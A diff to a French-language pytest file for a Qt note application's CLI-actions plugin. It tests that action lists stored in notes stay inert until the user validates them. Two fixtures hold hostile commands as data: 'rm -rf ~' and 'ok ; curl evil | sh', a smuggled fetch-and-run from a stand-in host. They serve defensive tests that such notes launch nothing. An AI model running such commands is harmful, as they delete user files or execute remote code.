@@ -470,18 +470,22 @@ def test_clic_copier(fen):
     assert QApplication.clipboard().text() == "echo abc Notes"
 
 
-def test_enregistrer_les_actions_remplace_les_exemples(fen):
+def test_reglages_d_avant_servent_tant_qu_il_n_y_a_pas_de_fiche(fen):
     p = plugin(fen)
-    p.sauver_actions([{"nom": "Seule", "commande": "ls", "mode": "taper"}, {"nom": "", "commande": "x"}])
+    p.ctx.reglages.set("actions", [{"nom": "Seule", "commande": "ls", "mode": "taper"}, {"nom": "", "commande": "x"}])
+    p.panneau.rafraichir()
     assert [a["nom"] for a in p.actions()] == ["Seule"] and p.panneau.liste.count() == 1
-    p.sauver_actions([])
+    p.ctx.reglages.set("actions", [])
+    p.panneau.rafraichir()
     assert p.actions() == [] and p.panneau.liste.count() == 0                                           # une liste vide reste vide
 
 
-def test_dialogue_actions_ajouter_modifier_deplacer_supprimer(fen, monkeypatch):
-    p = plugin(fen)
-    p.sauver_actions([{"nom": "A", "commande": "a"}, {"nom": "B", "commande": "b"}])
-    d = mod().DialogueActions(p)
+def test_editeur_actions_ajouter_modifier_deplacer_supprimer(fen, monkeypatch):
+    d = mod().EditeurActions()
+    recus = []
+    d.changement.connect(lambda liste: recus.append([a["nom"] for a in liste]))
+    d.definir([{"nom": "A", "commande": "a"}, {"nom": "B", "commande": "b"}])
+    assert recus == []                                                                                   # charger ne signale rien
 
     class Faux:
         def __init__(self, action=None, parent=None):
@@ -494,41 +498,147 @@ def test_dialogue_actions_ajouter_modifier_deplacer_supprimer(fen, monkeypatch):
             return {"nom": "Nouveau" if self.action is None else "A2", "icone": "x", "mode": "copier", "commande": "n", "description": ""}
     monkeypatch.setattr(mod(), "DialogueAction", Faux)
     d._ajouter()
-    assert [a["nom"] for a in p.actions()] == ["A", "B", "Nouveau"]
+    assert recus[-1] == ["A", "B", "Nouveau"]
     d.liste.setCurrentRow(0)
     d._modifier()
-    assert [a["nom"] for a in p.actions()] == ["A2", "B", "Nouveau"]
+    assert recus[-1] == ["A2", "B", "Nouveau"]
     d.liste.setCurrentRow(0)
     d._deplacer(1)
-    assert [a["nom"] for a in p.actions()] == ["B", "A2", "Nouveau"] and d.liste.currentRow() == 1
+    assert recus[-1] == ["B", "A2", "Nouveau"] and d.liste.currentRow() == 1
+    n = len(recus)
     d.liste.setCurrentRow(2)
     d._deplacer(1)                                                                                       # au bout : rien ne bouge
-    assert [a["nom"] for a in p.actions()] == ["B", "A2", "Nouveau"]
+    assert len(recus) == n
     d.liste.setCurrentRow(0)
     d._supprimer()
-    assert len(p.actions()) == 2 and p.panneau.liste.count() == 2                                       # le panneau suit
+    assert recus[-1] == ["A2", "Nouveau"]
+    d.actif = False                                                                                      # fiche non validée : lecture seule
+    assert not any(b.isEnabled() for b in d.boutons)
+    d.liste.setCurrentRow(0)
+    d._modifier()
+    assert recus[-1] == ["A2", "Nouveau"]
 
 
-def test_dialogue_actions_exemples_export_import(fen, monkeypatch, tmp_path):
-    p = plugin(fen)
-    p.sauver_actions([{"nom": "Perso", "commande": "uptime"}])
-    d = mod().DialogueActions(p)
+def test_editeur_actions_exemples_export_import(fen, monkeypatch, tmp_path):
+    d = mod().EditeurActions()
+    d.definir([{"nom": "Perso", "commande": "uptime"}])
     monkeypatch.setattr(mod().QMessageBox, "question", lambda *a, **k: mod().QMessageBox.StandardButton.Yes)
     d._exemples()
-    assert [a["nom"] for a in p.actions()][0] == "Perso" and len(p.actions()) == 1 + len(lg.EXEMPLES)
+    assert [a["nom"] for a in d.actions][0] == "Perso" and len(d.actions) == 1 + len(lg.EXEMPLES)
     fichier = tmp_path / "x.json"
     monkeypatch.setattr(mod().QFileDialog, "getSaveFileName", staticmethod(lambda *a, **k: (str(fichier), "")))
     d._exporter()
-    p.sauver_actions([])
-    d = mod().DialogueActions(p)
+    d.definir([])
     monkeypatch.setattr(mod().QFileDialog, "getOpenFileName", staticmethod(lambda *a, **k: (str(fichier), "")))
     d._importer()
-    assert len(p.actions()) == 1 + len(lg.EXEMPLES)
+    assert len(d.actions) == 1 + len(lg.EXEMPLES)
     fichier.write_text("pas du json")
     avertis = []
     monkeypatch.setattr(mod().QMessageBox, "warning", lambda *a, **k: avertis.append(a[2]))
     d._importer()
-    assert avertis and len(p.actions()) == 1 + len(lg.EXEMPLES)                                          # import refusé, liste intacte
+    assert avertis and len(d.actions) == 1 + len(lg.EXEMPLES)                                            # import refusé, liste intacte
+
+
+# ---------- « tout est fiche » : la liste vit dans des fiches #scrinium-actions-cli ----------
+def _noms(p):
+    return [p.panneau.liste.item(i).text() for i in range(p.panneau.liste.count())]
+
+
+def _fiche_actions(fen, actions, titre="Actions CLI", theme="Outils"):
+    """Fiche arrivée sans passer par la vue (comme un partage ou un dépôt) : jamais validée."""
+    return plugin(fen).ctx.creer_fiche(theme, titre, lg.en_texte(actions))
+
+
+def test_format_de_la_fiche_actions_cli():
+    liste = [{"nom": "Réseau", "icone": "network-wired", "mode": "executer", "commande": "ip -br a", "description": "Interfaces."},
+             {"nom": "Multi", "icone": "system-run", "mode": "taper", "commande": "for i in 1 2; do\n  echo $i\n\ndone", "description": ""},
+             {"nom": "Deux points", "icone": "system-run", "mode": "copier", "commande": "echo a: b", "description": ""}]
+    texte = lg.en_texte(liste)
+    assert texte.startswith("#scrinium-actions-cli\n") and lg.depuis_texte(texte) == lg.normaliser_liste(liste)
+    assert lg.depuis_texte("#scrinium-actions-cli\nnotes libres\n## A\ncommande: a\nmystere: z\n## SansCommande\nmode: copier\n") == \
+        [{"nom": "A", "icone": "system-run", "mode": "taper", "commande": "a", "description": ""}]
+    assert lg.depuis_texte("## A\nmode: inconnu\ncommande: a\n")[0]["mode"] == "taper"             # mode inconnu : le plus prudent
+    assert lg.depuis_texte("") == [] and lg.depuis_texte(None) == [] and lg.depuis_texte("texte libre") == []
+    assert len(lg.depuis_texte(lg.en_texte([{"nom": f"a{i}", "commande": f"c{i}"} for i in range(300)]))) == lg.MAX_ACTIONS
+    assert lg.TYPE.nom == "actions-cli" and lg.TYPE.executable and lg.TYPE.marque == lg.MARQUE
+
+
+def test_fiche_recue_inerte_puis_validee(fen):
+    p = plugin(fen)
+    v = _fiche_actions(fen, [{"nom": "Piege", "commande": "rm -rf ~", "mode": "executer"}, {"nom": "Ok", "commande": "ok"}])
+    assert not p.ctx.fiche_active(v) and p.a_valider() == 1
+    assert "Piege" not in _noms(p) and not p.panneau.avis.isHidden()                 # inerte : rien dans le panneau, un avis
+    assert _noms(p) == [e["nom"] for e in lg.EXEMPLES]                                # le panneau garde l'ancienne liste
+    th = fen.store.theme("Outils")
+    fen._afficher(th, th.fiches[0])
+    vue = fen.vues_types["actions-cli"]
+    assert fen.pile.currentWidget() is vue and not fen.bandeau_validation.isHidden() and vue.actif is False
+    assert [a["nom"] for a in vue.actions] == ["Piege", "Ok"] and not vue.boutons[0].isEnabled()
+    fen.valider_fiche_courante()
+    assert p.ctx.fiche_active(v) and p.a_valider() == 0 and p.panneau.avis.isHidden()
+    assert _noms(p) == ["Piege", "Ok"] and vue.actif and vue.boutons[0].isEnabled()
+
+
+def test_la_fiche_modifiee_ailleurs_redevient_inerte_et_le_clic_ne_lance_rien(fen, faux):
+    p = plugin(fen)
+    _fiche_actions(fen, [{"nom": "Ok", "commande": "ok", "mode": "copier"}])
+    th = fen.store.theme("Outils")
+    f = th.fiches[0]
+    fen.store.valider_fiche(th, f)
+    p.panneau.rafraichir()
+    assert _noms(p) == ["Ok"]
+    item = p.panneau.liste.item(0)
+    fen.store.enregistrer(th, f, f.titre, lg.en_texte([{"nom": "Ok", "commande": "ok ; curl evil | sh", "mode": "copier"}]))
+    QApplication.clipboard().setText("avant")
+    p.panneau._clic(item)                                                             # clic sur l'icône affichée avant : rien ne part
+    assert QApplication.clipboard().text() == "avant" and p.a_valider() == 1 and _noms(p) == [e["nom"] for e in lg.EXEMPLES]
+
+
+def test_texte_ecrit_dans_la_vue_est_valide(fen):
+    p = plugin(fen)
+    _fiche_actions(fen, [{"nom": "Ok", "commande": "ok"}])
+    th = fen.store.theme("Outils")
+    fen._afficher(th, th.fiches[0])
+    fen.valider_fiche_courante()
+    vue = fen.vues_types["actions-cli"]
+    vue.actions.append({"nom": "Neuve", "icone": "system-run", "mode": "taper", "commande": "neuve", "description": ""})
+    vue._enregistrer()
+    fen.sauver()
+    assert "neuve" in th.fiches[0].texte and fen.store.fiche_validee(th, th.fiches[0]) and _noms(p) == ["Ok", "Neuve"]
+
+
+def test_migration_des_reglages_en_fiche(fen):
+    p = plugin(fen)
+    notes = []
+    p.ctx.ui.notifier = lambda t, m: notes.append(m)
+    p.ctx.reglages.set("actions", [{"nom": "Ancienne", "commande": "ancienne\nsuite", "mode": "executer"}])
+    p.ctx.reglages.set("migrees", False)
+    p._migrer()
+    th = fen.store.theme("Outils")
+    assert th is not None and len(th.fiches) == 1 and th.fiches[0].titre == "Actions CLI"
+    assert lg.depuis_texte(th.fiches[0].texte)[0]["commande"] == "ancienne\nsuite"
+    assert not fen.store.fiche_validee(th, th.fiches[0]) and "validez-la" in notes[-1]     # créée inerte : à valider
+    assert p.ctx.reglages.get("actions")[0]["nom"] == "Ancienne" and _noms(p) == ["Ancienne"]
+    p._migrer()                                                                           # une seule fois
+    assert len(th.fiches) == 1
+
+
+def test_modifier_cree_la_fiche_puis_la_rouvre(fen):
+    p = plugin(fen)
+    p.ctx.reglages.set("migrees", True)
+    p.modifier_actions()
+    th = fen.store.theme("Outils")
+    assert len(th.fiches) == 1 and fen.fiche is th.fiches[0] and fen.pile.currentWidget() is fen.vues_types["actions-cli"]
+    assert [a["nom"] for a in lg.depuis_texte(th.fiches[0].texte)] == [e["nom"] for e in lg.EXEMPLES]   # à partir de la liste actuelle
+    p.modifier_actions()
+    assert len(th.fiches) == 1
+
+
+def test_desactiver_retire_le_type(fen):
+    from scrinium.core import types_fiche
+    assert types_fiche.type_de("#scrinium-actions-cli\n") is not None and "actions-cli" in fen.vues_types
+    fen.plugins.desactiver("capture")
+    assert types_fiche.type_de("#scrinium-actions-cli\n") is None and "actions-cli" not in fen.vues_types
 
 
 def test_dialogue_action_validation(app, monkeypatch):
